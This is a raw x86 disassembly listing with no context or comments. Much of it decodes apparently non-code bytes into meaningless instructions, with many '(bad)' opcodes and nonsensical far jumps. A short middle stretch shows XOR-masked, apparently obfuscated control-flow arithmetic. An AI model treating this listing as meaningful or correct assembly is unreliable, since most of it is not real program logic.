  4184c9:	fdivr  DWORD PTR [ecx+0x37]
  4184cc:	adc    al,0xf2
  4184ce:	aas    
  4184cf:	inc    edx
  4184d0:	ret    0x386f
  4184d3:	jbe    0x4184b2
  4184d5:	aam    0x64
  4184d7:	(bad)  
  4184d9:	pop    esi
  4184da:	sbb    ecx,eax
  4184dc:	xor    ebp,DWORD PTR [edi+ecx*1]
  4184df:	mov    dh,0xfe
  4184e1:	test   eax,0xaa24f364
  4184e6:	test   ebp,edx
  4184e8:	shr    eax,0x2b
  4184eb:	xor    esp,DWORD PTR [edi+0x9a29107]
  4184f1:	cdq    
  4184f2:	inc    eax
  4184f3:	mov    ecx,DWORD PTR [edi-0x7d]
  4184f6:	push   edx
  4184f7:	sub    BYTE PTR [edx+0x25d36710],dl
  4184fd:	add    dh,BYTE PTR [ebp+0x45]
  418500:	popa   
  418501:	jo     0x4184b4
  418503:	repnz data16 fidiv DWORD PTR [esi]
  418507:	clc    
  418508:	mov    ds:0xd26eefb3,eax
  41850d:	add    bh,BYTE PTR [ecx]
  41850f:	or     bl,dl
  418511:	mov    bl,0x5e
  418513:	imul   eax,DWORD PTR [esp+edi*2],0x91d3f098
  41851a:	cli    
  41851b:	or     edx,0x7ac0be87
  418521:	pop    esp
  418522:	mov    dh,0x1f
  418524:	shr    bh,cl
  418526:	sub    BYTE PTR [ecx+0x725b374e],0x7a
  41852d:	mov    BYTE PTR [ecx+0x2a],cl
  418530:	inc    esi
  418531:	sub    eax,0x87dc96b6
  418536:	add    al,0xe6
  418538:	or     DWORD PTR [ebp-0x2b],ebp
  41853b:	cmp    DWORD PTR [edx+0x616bfbf2],0x7cfc8b3f
  418545:	or     BYTE PTR [esi+0x47],bl
  418548:	loope  0x4185b6
  41854a:	mov    bl,0xc7
  41854c:	lods   eax,DWORD PTR ds:[esi]
  41854d:	lock inc ecx
  41854f:	scas   eax,DWORD PTR es:[edi]
  418550:	mov    eax,0xab9105f5
  418555:	xchg   ebp,ecx
  418557:	mov    dh,0xa9
  418559:	jae    0x4185cf
  41855b:	push   ebp
  41855c:	ins    BYTE PTR es:[edi],dx
  41855d:	das    
  41855e:	and    DWORD PTR [esp+eiz*8],0xffffffa6
  418562:	xchg   esp,eax
  418563:	in     al,0xd4
  418565:	(bad)  
  418566:	jmp    0x4184fe
  418568:	cmp    ebp,esp
  41856a:	and    eax,0x3af8ba95
  41856f:	ss mov bl,0x1
  418572:	mov    ebp,DWORD PTR [ebp+0x2115bc73]
  418578:	sbb    ah,dl
  41857a:	cdq    
  41857b:	fadd   DWORD PTR [edx+0x46cf2b64]
  418581:	xor    al,BYTE PTR [esp+eiz*2+0xad85047]
  418588:	in     al,dx
  418589:	cmp    eax,0x84a5aff8
  41858e:	mov    dl,0x8b
  418590:	sub    dl,BYTE PTR [ebp-0x48]
  418593:	out    0x62,eax
  418595:	add    DWORD PTR [edi-0x2f27cca0],esp
  41859b:	pop    edx
  41859c:	imul   edi,DWORD PTR [edx-0xa2ee652],0x4c3550c2
  4185a6:	shl    DWORD PTR [eax-0x360b62da],0x49
  4185ad:	pop    ss
  4185ae:	add    eax,0xaf8f932c
  4185b3:	xor    BYTE PTR [edi-0x64],ah
  4185b6:	push   esi
  4185b7:	retf   
  4185b8:	xor    al,0x37
  4185ba:	mov    edx,0x2fc86c0d
  4185bf:	ss jno 0x4185c9
  4185c2:	rol    DWORD PTR [ebx],1
  4185c4:	stos   BYTE PTR es:[edi],al
  4185c5:	lods   al,BYTE PTR ds:[esi]
  4185c6:	(bad)  
  4185c7:	cmc    
  4185c8:	push   cs
  4185c9:	(bad)  
  4185ca:	into   
  4185cb:	mov    WORD PTR [eax+0x36],fs
  4185ce:	ins    DWORD PTR es:[edi],dx
  4185cf:	addr16 pop ebp
  4185d1:	fimul  DWORD PTR [ebx+edx*1-0x48bf26da]
  4185d8:	or     BYTE PTR [edx-0x1e99aaa6],dl
  4185de:	test   DWORD PTR [eax-0x21],edx
  4185e1:	fadd   DWORD PTR [ebp-0xc1712cf]
  4185e7:	push   es
  4185e8:	mov    ebx,0xfa43a5a
  4185ed:	pusha  
  4185ee:	dec    ecx
  4185ef:	pop    es
  4185f0:	in     eax,0xe7
  4185f2:	xchg   ebx,eax
  4185f3:	sbb    dl,0x9c
  4185f6:	push   ebp
  4185f7:	sti    
  4185f8:	(bad)  
  4185f9:	push   ecx
  4185fa:	sbb    eax,0x67719488
  4185ff:	in     al,0x4d
  418601:	pop    esi
  418602:	(bad)  
  418603:	cmp    eax,0x3a3a8309
  418608:	(bad)
  41860b:	out    0xf,eax
  41860d:	mov    al,0xa3
  41860f:	xchg   esi,eax
  418610:	adc    DWORD PTR cs:[ecx+eax*2],0x6
  418615:	dec    edi
  418616:	or     bl,BYTE PTR [ebp-0x1a]
  418619:	in     eax,dx
  41861a:	shr    al,cl
  41861c:	add    al,BYTE PTR [ebx-0x32]
  41861f:	inc    ebx
  418620:	sub    eax,0x92e90318
  418625:	(bad)  [ecx]
  418627:	pop    ecx
  418628:	cs push ds
  41862a:	pop    esp
  41862b:	jnp    0x4186a6
  41862d:	xchg   esi,eax
  41862e:	jae    0x418681
  418630:	lds    esp,FWORD PTR [esi]
  418632:	fwait
  418633:	push   0xecc100df
  418638:	sub    eax,0xd0d39111
  41863d:	mov    al,0x2d
  41863f:	mov    eax,ds:0x47505642
  418644:	inc    esi
  418645:	adc    bh,dh
  418647:	fld    TBYTE PTR [esp+edi*4+0x701b8805]
  41864e:	sub    eax,0x4e054fdb
  418653:	mov    esi,0xb9c0f611
  418658:	xor    eax,0x8ece0cf0
  41865d:	cmp    ebp,DWORD PTR [ebx+edx*2]
  418660:	mov    ah,0xc8
  418662:	cmp    BYTE PTR [eax],0x2a
  418665:	sbb    eax,esp
  418667:	and    al,0x41
  418669:	bound  ebp,QWORD PTR [edi-0x6db4286f]
  41866f:	adc    DWORD PTR [ecx+0x598b5140],ebx
  418675:	bound  eax,QWORD PTR [esi+0x23]
  418678:	jecxz  0x4185fc
  41867a:	fwait
  41867b:	mov    edx,0xf2c53278
  418680:	(bad)  
  418681:	fcomp  st(4)
  418683:	repz mov eax,0x26ff60e2
  418689:	xchg   esp,eax
  41868a:	and    ebx,esp
  41868c:	stos   BYTE PTR es:[edi],al
  41868d:	imul   esi,edi,0xedb0c744
  418693:	pop    edi
  418694:	call   0x8c64:0xb2587b50
  41869b:	sub    DWORD PTR [edx],esp
  41869d:	xchg   ebx,eax
  41869e:	mov    dl,0x66
  4186a0:	push   0x491a6619
  4186a5:	mov    ch,0xc0
  4186a7:	not    DWORD PTR [eax+0x5a033f32]
  4186ad:	jo     0x418677
  4186af:	adc    al,0xe7
  4186b1:	pop    eax
  4186b2:	push   edx
  4186b3:	cmp    ah,BYTE PTR [edx+edi*8]
  4186b6:	lock xchg ecx,eax
  4186b8:	add    dh,BYTE PTR [esi+0x8e579db]
  4186be:	mov    al,0xcd
  4186c0:	rcl    DWORD PTR [ebx],1
  4186c2:	pinsrw mm2,WORD PTR [ebx],0x8f
  4186c6:	jo     0x418666
  4186c8:	mov    ds:0x2c1d3d63,al
  4186cd:	adc    ebp,DWORD PTR [ebp-0x72e44c96]
  4186d3:	mov    ecx,0x244f3269
  4186d8:	jmp    0x418729
  4186da:	mov    edi,0xc8ce7571
  4186df:	adc    edx,DWORD PTR [esi-0x54]
  4186e2:	sbb    ebp,DWORD PTR [ebx-0x3f4b54ad]
  4186e8:	fcomp  QWORD PTR [edx-0x7b]
  4186eb:	lahf   
  4186ec:	fs leave 
  4186ee:	or     BYTE PTR es:[eax+0x3],0x87
  4186f3:	psrad  mm1,QWORD PTR [eax+0x748609e7]
  4186fa:	lods   al,BYTE PTR ds:[esi]
  4186fb:	and    bl,BYTE PTR [ebx+0x4c2f97df]
  418701:	(bad)  
  418702:	pushf  
  418703:	mov    esp,0x7e6ddda1
  418708:	xor    edx,eax
  41870a:	lea    edx,[edx+ebx*1+0x3272e0]
  418711:	mov    DWORD PTR [ebp-0xc],edx
  418714:	mov    edx,DWORD PTR [ebp-0x10]
  418717:	xor    edx,eax
  418719:	add    edx,esi
  41871b:	jne    0x40f646
  418721:	jmp    0x41abbe
  418726:	mov    ecx,DWORD PTR [ebp-0x14]
  418729:	mov    DWORD PTR [ebp+0x8],ecx
  41872c:	jmp    0x4187a5
  418731:	mov    ecx,DWORD PTR [ebp+0x8]
  418734:	mov    edx,DWORD PTR [ebp-0x8]
  418737:	xor    ecx,eax
  418739:	xor    edx,eax
  41873b:	sub    ecx,edx
  41873d:	sub    ecx,esi
  41873f:	xor    ecx,eax
  418741:	mov    DWORD PTR [ebp+0x8],ecx
  418744:	mov    ecx,DWORD PTR [ebp+0x8]
  418747:	mov    edx,DWORD PTR [ebp-0x58]
  41874a:	add    ecx,0x5708f8
  418750:	imul   ecx,edx
  418753:	mov    DWORD PTR [ebp-0x58],ecx
  418756:	mov    ecx,DWORD PTR [ebp+0x8]
  418759:	mov    edx,DWORD PTR [ebp-0x54]
  41875c:	add    ecx,0x64f8da
  418762:	or     ecx,edx
  418764:	mov    DWORD PTR [ebp-0x54],ecx
  418767:	mov    ecx,DWORD PTR [ebp+0x8]
  41876a:	mov    edx,DWORD PTR [ebp-0x50]
  41876d:	add    ecx,0x242ebed
  418773:	xor    ecx,edx
  418775:	mov    DWORD PTR [ebp-0x50],ecx
  418778:	mov    ecx,DWORD PTR [ebp+0x8]
  41877b:	mov    edx,DWORD PTR [ebp-0x4c]
  41877e:	add    ecx,edi
  418780:	and    ecx,edx
  418782:	mov    DWORD PTR [ebp-0x4c],ecx
  418785:	mov    ecx,DWORD PTR [ebp+0x8]
  418788:	mov    edx,DWORD PTR [ebp-0x48]
  41878b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  418792:	mov    DWORD PTR [ebp-0x48],ecx
  418795:	mov    ecx,DWORD PTR [ebp+0x8]
  418798:	mov    edx,0xfa5e15e2
  41879d:	sub    edx,ecx
  41879f:	add    edx,DWORD PTR [ebp-0x44]
  4187a2:	mov    DWORD PTR [ebp-0x44],edx
  4187a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4187a8:	xor    ecx,eax
  4187aa:	add    ecx,esi
  4187ac:	jne    0x418731
  4187b2:	jmp    0x41abca
  4187b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4187ba:	mov    edx,DWORD PTR [ebp-0x8]
  4187bd:	xor    ecx,eax
  4187bf:	xor    edx,eax
  4187c1:	sub    ecx,edx
  4187c3:	sub    ecx,esi
  4187c5:	xor    ecx,eax
  4187c7:	mov    DWORD PTR [ebp+0x8],ecx
  4187ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4187cd:	mov    edx,DWORD PTR [ebp-0x58]
  4187d0:	jmp    0x41ab56
  4187d5:	sub    eax,0x97a551eb
  4187da:	fwait
  4187db:	lods   eax,DWORD PTR ds:[esi]
  4187dc:	fistp  DWORD PTR [edx]
  4187de:	pop    ecx
  4187df:	imul   DWORD PTR [ecx]
  4187e1:	xor    BYTE PTR [esi],cl
  4187e3:	imul   ebp,DWORD PTR [ebx+ebp*8+0x34],0x79
  4187e8:	jp     0x4187eb
  4187ea:	pop    edi
  4187eb:	jp     0x418867
  4187ed:	loop   0x4187ad
  4187ef:	test   eax,0x979c56c7
  4187f4:	xchg   edx,eax
  4187f5:	mov    eax,ds:0x4526be63
  4187fa:	mov    BYTE PTR [ebx+ebx*1],0x1c
  4187fe:	mov    dl,0x50
  418800:	jp     0x4187cf
  418802:	xor    esi,DWORD PTR [edi-0x231ea1]
  418808:	xlat   BYTE PTR ds:[ebx]
  418809:	push   cs
  41880a:	shl    DWORD PTR [ebp+0x1f8cc568],cl
  418810:	call   0x21afa8d1
  418815:	dec    ecx
  418816:	(bad)  
  418817:	rcr    BYTE PTR [ebx],cl
  418819:	adc    eax,0x83119015
  41881e:	sti    
  41881f:	and    DWORD PTR [ecx],ebx
  418821:	xchg   edi,eax
  418822:	mov    bl,0x88
  418824:	pop    edx
  418825:	jno    0x418848
  418827:	int    0xc1
  418829:	stc    
  41882a:	repnz mov al,0x34
  41882d:	ja     0x418862
  41882f:	inc    edi
  418830:	js     0x418841
  418832:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418833:	ins    DWORD PTR es:[edi],dx
  418834:	stos   BYTE PTR es:[edi],al
  418835:	adc    al,0xd1
  418837:	inc    ebx
  418838:	enter  0x696c,0xc3
  41883c:	xchg   DWORD PTR [eax],esp
  41883e:	mov    al,0xe8
  418840:	sub    cl,BYTE PTR ds:0x9d9cf843
  418846:	shl    DWORD PTR ds:0x46531cc9,1
  41884c:	das    
  41884d:	pop    ds
  41884e:	push   esp
  41884f:	mov    ebx,0x198eb6a
  418854:	aas    
  418855:	in     eax,0x9b
  418857:	cmp    eax,esi
  418859:	in     eax,dx
  41885a:	pop    ss
  41885b:	xchg   ebp,eax
  41885c:	inc    ebp
  41885d:	xchg   esi,eax
  41885e:	inc    edi
  41885f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418860:	rcr    bh,0x62
  418863:	nop
  418864:	pop    ecx
  418865:	(bad)  
  418866:	cwde   
  418867:	(bad)  
  418868:	jmp    0x58cf:0x5fd777b5
  41886f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418870:	loopne 0x4188ed
  418872:	mov    cl,BYTE PTR [ebx+0x8]
  418875:	dec    edx
  418876:	(bad)  
  418877:	retf   0xc842
  41887a:	pusha  
  41887b:	xchg   ebx,eax
  41887c:	mov    ecx,0x7e145e91
  418881:	jp     0x418886
  418883:	loope  0x418808
  418885:	retf   
  418886:	mov    ecx,0x48167f96
  41888b:	sbb    eax,0xdaa6df3
  418890:	jmp    0x4188b0
  418892:	jae    0x4188de
  418894:	cmp    dh,BYTE PTR [edi]
  418896:	into   
  418897:	inc    edx
  418898:	loope  0x4188c9
  41889a:	pop    edi
  41889b:	hlt    
  41889c:	jp     0x41882d
  41889e:	push   cs
  41889f:	cdq    
  4188a0:	push   es
  4188a1:	xor    edi,ebp
  4188a3:	rol    esi,cl
  4188a5:	popf   
  4188a6:	and    ebx,ecx
  4188a8:	je     0x41883a
  4188aa:	mov    ds:0x6bb15544,al
  4188af:	jl     0x418923
  4188b1:	loopne 0x418857
  4188b3:	jecxz  0x4188be
  4188b5:	stos   DWORD PTR es:[di],eax
  4188b7:	cmc    
  4188b8:	xchg   ecx,eax
  4188b9:	sub    eax,0x54ec7f84
  4188be:	mov    ds:0x11964dde,eax
  4188c3:	jno    0x4188f1
  4188c5:	and    al,0xbb
  4188c7:	js     0x418883
  4188c9:	pushf  
  4188ca:	shl    ch,0xc9
  4188cd:	mov    WORD PTR [ebp-0x33],ss
  4188d0:	test   al,0x6a
  4188d2:	jmp    0x4550eeb5
  4188d7:	test   BYTE PTR [ebp-0x21],0x3d
  4188db:	mov    dh,0x54
  4188dd:	cmp    ebx,DWORD PTR [esi-0x70]
  4188e0:	cmp    BYTE PTR [ebx],cl
  4188e2:	(bad)  
  4188e3:	pop    ecx
  4188e4:	xchg   ebx,eax
  4188e5:	shl    ah,cl
  4188e7:	fst    st(2)
  4188e9:	dec    esi
  4188ea:	ret    
  4188eb:	scas   eax,DWORD PTR es:[edi]
  4188ec:	and    ah,dl
  4188ee:	dec    esp
  4188ef:	push   esp
  4188f0:	inc    esp
  4188f1:	icebp  
  4188f2:	popf   
  4188f3:	fiadd  DWORD PTR [ebp+0x29770f42]
  4188f9:	mov    ebp,0xe775581b
  4188fe:	pop    ebp
  4188ff:	cmp    cl,bl
  418901:	pop    esi
  418902:	jns    0x418915
  418904:	sub    eax,0x77fa5c8a
  418909:	daa    
  41890a:	jne    0x4188a9
  41890c:	xor    al,0xc9
  41890e:	adc    BYTE PTR [ecx+esi*2],ch
  418911:	into   
  418912:	ins    DWORD PTR es:[edi],dx
  418913:	push   esp
  418914:	retf   
  418915:	add    BYTE PTR [eax+0xf595803],0x32
  41891c:	push   ds
  41891d:	xchg   ebp,eax
  41891e:	into   
  41891f:	adc    bl,bl
  418921:	fldenv [edi+0x78109e34]
  418927:	in     eax,0xb9
  418929:	or     edx,DWORD PTR [esi-0x67]
  41892c:	mov    esp,0xcf6f646a
  418931:	dec    ebp
  418932:	xchg   BYTE PTR [eax-0x170f008e],dh
  418938:	out    dx,al
  418939:	ret    
  41893a:	sbb    al,0x75
  41893c:	xchg   ch,dl
  41893e:	inc    ecx
  41893f:	mov    ds:0xb65398be,eax
  418944:	clc    
  418945:	imul   ecx,DWORD PTR [eax-0x58],0x814e5822
  41894c:	es push ebp
  41894e:	arpl   WORD PTR [eax],ax
  418950:	aad    0x3a
  418952:	(bad)  
  418953:	xchg   ecx,eax
  418954:	dec    edx
  418955:	pop    edx
  418956:	mov    al,ds:0x6c7ccabb
  41895b:	(bad)  
  41895d:	mov    ah,0xec
  41895f:	jge    0x418915
  418961:	dec    edx
  418962:	shr    DWORD PTR [esi+0x8],1
  418965:	fisubr WORD PTR [edi+0x24]
  418968:	loope  0x41893a
  41896a:	and    esi,esp
  41896c:	and    esp,DWORD PTR [ebp+0xfcbc5c5]
  418972:	mov    ds:0x106bc365,al
  418977:	call   DWORD PTR [esi+0x203aa09c]
  41897d:	pop    ebx
  41897e:	jmp    0xbdf6:0xad159837
  418985:	gs popa 
  418987:	pop    esi
  418988:	mov    cl,0xce
  41898a:	mov    dh,0xdb
  41898c:	pop    eax
  41898d:	stos   BYTE PTR es:[edi],al
  41898e:	(bad)  
  41898f:	(bad)  
  418991:	push   cs
  418992:	outs   dx,BYTE PTR ds:[esi]
  418993:	pop    eax
  418994:	cmp    BYTE PTR [edi],bh
  418996:	mov    ecx,0xf61bee52
  41899b:	lgs    esp,FWORD PTR [ecx]
  41899e:	cmp    al,0xf4
  4189a0:	imul   edi,DWORD PTR [ecx],0xffffffd4
  4189a3:	xchg   dh,dl
  4189a5:	je     0x4189bf
  4189a7:	push   ebp
  4189a8:	sbb    esp,DWORD PTR [edx+0x114360d]
  4189ae:	push   es
  4189af:	or     al,cl
  4189b1:	dec    eax
  4189b2:	cld    
  4189b3:	idiv   BYTE PTR [ebp+0x7cb9df8f]
  4189b9:	ficom  WORD PTR gs:0x552a4356
  4189c0:	scas   al,BYTE PTR es:[edi]
  4189c1:	repnz jmp 0x5bde:0xe28b3fee
  4189c9:	fist   DWORD PTR [edi]
  4189cb:	push   ebp
  4189cc:	outs   dx,DWORD PTR ds:[esi]
  4189cd:	mov    eax,ds:0xfadfc30
  4189d2:	mov    ebp,0x455df56c
  4189d7:	xor    DWORD PTR [ebp+0x7cdd08f8],ecx
  4189dd:	push   esp
  4189de:	fdiv   DWORD PTR [ebx]
  4189e0:	add    BYTE PTR [eax-0x79],ah
  4189e3:	fwait
  4189e4:	dec    edx
  4189e5:	lahf   
  4189e6:	mov    esi,ecx
  4189e8:	jbe    0x4189a4
  4189ea:	add    eax,0x9aa331a7
  4189ef:	add    DWORD PTR [ecx-0x5bcdc13d],edi
  4189f5:	hlt    
  4189f6:	cmp    DWORD PTR [eax-0x3f0c332c],ecx
  4189fc:	scas   al,BYTE PTR es:[edi]
  4189fd:	pop    edx
  4189fe:	add    BYTE PTR [esi-0x2b8525be],bh
  418a04:	xor    esi,DWORD PTR [ebx+esi*2]
  418a07:	hlt    
  418a08:	push   ebp
  418a09:	sub    al,0x32
  418a0b:	push   edi
  418a0c:	push   ds
  418a0d:	nop
  418a0e:	test   DWORD PTR [ebx],esp
  418a10:	cmp    eax,DWORD PTR [edi-0x15d738ff]
  418a16:	shr    BYTE PTR [ebx+0x61e04b15],cl
  418a1c:	and    BYTE PTR [eax-0x61145adb],0x49
  418a23:	pop    edx
  418a24:	push   es
  418a25:	sub    al,0xd2
  418a27:	ds cld 
  418a29:	and    eax,0xb715f04d
  418a2e:	jmp    0x4189ed
  418a30:	push   esi
  418a31:	push   esi
  418a32:	xor    bh,BYTE PTR [edx+0x3d486da2]
  418a38:	dec    ecx
  418a39:	pop    esi
  418a3a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  418a3c:	test   eax,0x136dd971
  418a41:	out    dx,eax
  418a42:	loope  0x4189f0
  418a44:	adc    al,0xdb
  418a46:	lahf   
  418a47:	(bad)  [ebx+0x168fc2a8]
  418a4d:	pop    ebx
  418a4e:	and    edi,DWORD PTR [edi-0x77]
  418a51:	popf   
  418a52:	jnp    0x418ad3
  418a54:	push   esp
  418a55:	push   ds
  418a56:	mov    eax,0x29d191f8
  418a5b:	inc    esi
  418a5c:	int    0xc3
  418a5e:	mov    cl,0x9a
  418a60:	mov    eax,ds:0xe03a854c
  418a65:	lahf   
  418a66:	lds    ecx,FWORD PTR ds:0x55369c08
  418a6c:	cmp    al,0x83
  418a6e:	and    al,0x23
  418a70:	jae    0x418ab7
  418a72:	sahf   
  418a73:	hlt    
  418a74:	in     eax,0xd1
  418a76:	push   cs
  418a77:	fwait
  418a78:	add    al,0x27
  418a7a:	mov    cl,0xe5
  418a7c:	or     ah,dl
  418a7e:	inc    edi
  418a7f:	xor    edi,edi
  418a81:	hlt    
  418a82:	dec    esi
  418a83:	push   ds
  418a84:	jmp    0x8dd9debe
  418a89:	sub    esi,esp
  418a8b:	cwde   
  418a8c:	jns    0x418a2f
  418a8e:	cld    
  418a8f:	mov    eax,0x7b957956
  418a94:	push   cs
  418a95:	mov    bh,BYTE PTR [edi-0x1524129]
  418a9b:	rcr    BYTE PTR [eax],cl
  418a9d:	(bad)  
  418a9e:	fstp   TBYTE PTR [edx]
  418aa0:	add    BYTE PTR [ebp+0x7a],ah
  418aa3:	int3   
  418aa4:	sub    esp,DWORD PTR [ebp+0x4b848e2a]
  418aaa:	inc    edx
  418aab:	mov    dl,0x3
  418aad:	xchg   ecx,eax
  418aae:	and    DWORD PTR [edi-0x2509bf76],ecx
  418ab4:	add    esp,DWORD PTR [ebp-0x259ebd32]
  418aba:	jae    0x418a89
  418abc:	addr16 push edi
  418abe:	in     eax,0xb5
  418ac0:	xor    al,0xb1
  418ac2:	loope  0x418ab2
  418ac4:	xchg   ecx,eax
  418ac5:	mov    ebp,DWORD PTR ds:0xe8cda1fc
  418acb:	or     dh,0x6b
  418ace:	pop    esp
  418acf:	pop    edx
  418ad0:	arpl   WORD PTR [ecx-0x27575eb3],dx
  418ad6:	ror    BYTE PTR [eax],1
  418ad8:	pop    esp
  418ad9:	pusha  
  418ada:	ror    ch,cl
  418adc:	test   BYTE PTR [ecx+0x62],cl
  418adf:	xchg   DWORD PTR [edx-0x64a6e628],esp
  418ae5:	fcom   DWORD PTR [ebx-0x6a]
  418ae8:	test   DWORD PTR [ebx+0x45],esp
  418aeb:	xchg   edi,eax
  418aec:	inc    esi
  418aed:	dec    edx
  418aee:	pop    ds
  418aef:	sub    DWORD PTR [ecx],esp
  418af1:	push   ss
  418af2:	(bad)  
  418af3:	jo     0x418b4e
  418af5:	mov    ah,0xa6
  418af7:	das    
  418af8:	lock std 
  418afa:	xor    eax,0x931eb694
  418aff:	sub    BYTE PTR [edx+0x35702e2b],al
  418b05:	xor    eax,0x5abc55b4
  418b0a:	lods   al,BYTE PTR ds:[esi]
  418b0b:	daa    
  418b0c:	aad    0x3
  418b0e:	and    ch,dl
  418b10:	es cmc 
  418b12:	cli    
  418b13:	addr16 inc edi
  418b15:	std    
  418b16:	dec    eax
  418b17:	add    ch,BYTE PTR [edi+0x63]
  418b1a:	fidiv  WORD PTR [eax+0x38f67609]
  418b20:	fs cli 
  418b22:	dec    edi
  418b23:	xor    bl,BYTE PTR [ecx]
  418b25:	rcr    edi,0xe9
  418b28:	cmp    BYTE PTR [edi],cl
  418b2a:	sbb    bh,BYTE PTR [esi+0x20]
  418b2d:	sub    al,0xde
  418b2f:	push   cs
  418b30:	shl    BYTE PTR [esi-0x2629a5b3],0x97
  418b37:	jle    0x418b9e
  418b39:	sahf   
  418b3a:	mov    ds:0x44f34d0,al
  418b3f:	cli    
  418b40:	jmp    0x7f64:0xc04a1398
  418b47:	jns    0x418b89
  418b49:	scas   al,BYTE PTR es:[edi]
  418b4a:	jnp    0x418b92
  418b4c:	jo     0x418b1d
  418b4e:	nop
  418b4f:	mov    ds:0x23568dd7,al
  418b54:	daa    
  418b55:	loop   0x418b9f
  418b57:	(bad)  
  418b58:	xor    al,0x4c
  418b5a:	xor    BYTE PTR [edx+0x2a8667d8],ch
  418b60:	nop
  418b61:	dec    esp
  418b62:	mov    esi,0x208cdc5a
  418b67:	pusha  
  418b68:	push   ebp
  418b69:	mov    cl,0x55
  418b6b:	stc    
  418b6c:	fidiv  WORD PTR [ebx-0x16]
  418b6f:	pop    edx
  418b70:	pop    esp
  418b71:	jno    0x418b3b
  418b73:	jl     0x418b25
  418b75:	in     al,0xf9
  418b77:	push   0x5
  418b79:	mov    cl,0x18
  418b7b:	call   FWORD PTR gs:[ebp+0x49599a84]
  418b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b83:	lds    ebx,FWORD PTR [ecx+esi*4-0x41ff9845]
  418b8a:	add    eax,DWORD PTR [ebx+0x5a]
  418b8d:	inc    esi
  418b8e:	pop    edi
  418b8f:	lds    ecx,FWORD PTR [esi+0x63]
  418b92:	add    eax,0x108d344d
  418b97:	and    al,0x22
  418b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b9a:	mov    al,0x8d
  418b9c:	xor    ebx,DWORD PTR [esi+0x2a6ea967]
  418ba2:	inc    ebx
  418ba3:	fistp  QWORD PTR [ebp+0x1c90e9f1]
  418ba9:	jae    0x418b2d
  418bab:	jo     0x418bab
  418bad:	or     DWORD PTR [esi+0x653e7560],ecx
  418bb3:	inc    eax
  418bb4:	dec    eax
  418bb5:	ins    DWORD PTR es:[edi],dx
  418bb6:	out    0x43,al
  418bb8:	jae    0x418be3
  418bba:	mov    al,ds:0x146e87c2
  418bbf:	mov    bl,0xc9
  418bc1:	adc    al,0x7f
  418bc3:	sbb    ebx,DWORD PTR [ebp+0x74166d8e]
  418bc9:	xchg   edi,eax
  418bca:	or     bl,BYTE PTR [esi+0x17e62ce0]
  418bd0:	std    
  418bd1:	mov    esp,0x28b902b9
  418bd6:	lods   eax,DWORD PTR ds:[esi]
  418bd7:	cli    
  418bd8:	add    eax,0xafa3030e
  418bdd:	jno    0x418bcf
  418bdf:	sbb    al,BYTE PTR [ecx+0x337101e2]
  418be5:	mov    ebx,0x1963d43
  418bea:	jb     0x418c24
  418bec:	(bad)  
  418bed:	(bad)  
  418bee:	sbb    BYTE PTR [esi+0x30c99e78],dl
  418bf4:	fucom  st(4)
  418bf6:	data16 jo 0x418c72
  418bf9:	int3   
  418bfa:	repnz inc ecx
  418bfc:	or     al,al
  418bfe:	xchg   ecx,eax
  418bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c00:	and    ecx,ebx
  418c02:	mov    dl,0x80
  418c04:	ror    BYTE PTR es:[ebx],cl
  418c07:	sbb    DWORD PTR [esi+0xb198e15],edx
  418c0d:	arpl   WORD PTR [esi],ax
  418c0f:	xor    eax,edx
  418c11:	(bad)  
  418c12:	mov    ds:0xf1972c37,eax
  418c17:	sahf   
  418c18:	jge    0x418bef
  418c1a:	dec    edx
  418c1b:	test   BYTE PTR [ecx],dl
  418c1d:	push   esp
  418c1e:	xor    ah,BYTE PTR [eax+ebx*4-0x2b66af0a]
  418c25:	push   ecx
  418c26:	sub    al,0x78
  418c28:	xchg   ecx,eax
  418c29:	int    0x15
  418c2b:	add    DWORD PTR [eax+0x31],esi
  418c2e:	and    eax,0x79386549
  418c33:	in     al,dx
  418c34:	ja     0x418bd3
  418c36:	retf   
  418c37:	leave  
  418c38:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c3a:	jmp    0xe1d2b666
  418c3f:	mov    bh,BYTE PTR [edx]
  418c41:	jmp    0xa185:0x7579f333
  418c48:	rcl    ecx,0x54
  418c4b:	pop    ecx
  418c4c:	rcl    ebp,1
  418c4e:	fs leave 
  418c50:	je     0x418bfe
  418c52:	xor    ebx,esp
  418c54:	ins    DWORD PTR es:[edi],dx
  418c55:	or     edi,ecx
  418c57:	jecxz  0x418c20
  418c59:	mov    edx,0x19a49884
  418c5e:	test   eax,0x43e61ae1
  418c63:	pop    ds
  418c64:	sbb    DWORD PTR [edi-0x537525dc],0xff619a4a
  418c6e:	shl    BYTE PTR [edx+0x631daeb4],1
  418c74:	mov    eax,ds:0x12c298a8
  418c79:	pop    es
  418c7a:	push   esp
  418c7b:	ret    
  418c7c:	ret    0xe1e2
  418c7f:	pusha  
  418c80:	or     edi,ecx
  418c82:	xor    eax,0xcc37d7b5
  418c87:	inc    eax
  418c88:	mov    edx,0x6efaf51f
  418c8d:	cmp    esi,esp
  418c8f:	xchg   ebp,eax
  418c90:	add    BYTE PTR [edx-0xf],0xab
  418c94:	or     BYTE PTR [ebx],bh
  418c96:	js     0x418c9c
  418c98:	sar    BYTE PTR [edx+0x7c],0x37
  418c9c:	(bad)  
  418c9d:	jbe    0x418ca4
  418c9f:	mov    ebx,ebp
  418ca1:	pop    esi
  418ca2:	dec    esi
  418ca3:	inc    ebx
  418ca4:	jnp    0x418c36
  418ca6:	imul   ebp,DWORD PTR ds:0x77fd78b6,0x5f
  418cad:	mov    ebx,0xa7d5591
  418cb2:	cmp    eax,0xb59ebdd4
  418cb7:	cmp    eax,0xecce093
  418cbc:	xor    edx,DWORD PTR [ecx+ebp*4+0x3718949]
  418cc3:	and    BYTE PTR [ecx-0x7f],ah
  418cc6:	std    
  418cc7:	fild   QWORD PTR [ebp-0x5d]
  418cca:	cmp    ebx,DWORD PTR [esi+0x2119f5e6]
  418cd0:	in     al,dx
  418cd1:	or     dh,BYTE PTR [ecx+0x75]
